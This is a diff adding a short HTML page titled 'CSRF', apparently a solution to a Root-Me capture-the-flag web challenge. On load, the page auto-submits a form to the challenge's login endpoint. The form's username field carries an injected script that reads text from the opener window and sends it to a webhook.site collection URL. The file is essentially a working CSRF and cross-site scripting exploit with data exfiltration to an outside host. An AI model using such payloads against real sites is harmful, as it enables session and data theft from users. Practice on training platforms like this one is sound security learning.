@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Second window</title>
+</head>
+<body>
+<h1>CSRF</h1>
+<form method="POST" action="http://challenge01.root-me.org:58003/login">
+  <input type="text" name="username" value="<script>fetch('https://webhook.site/119fadea-dcba-4c14-a612-4097f922c016?g6g'+window.opener.document.querySelectorAll('section > p')[2].innerHTML)</script>">
+  <input type="text" name="secret" value="redacted">
+  <input type="submit">
+</form>
+<script>
+  window.opener.postMessage({}, "*")
+  document.querySelector("form").submit()
+</script>
+
+
+</body>
+</html>
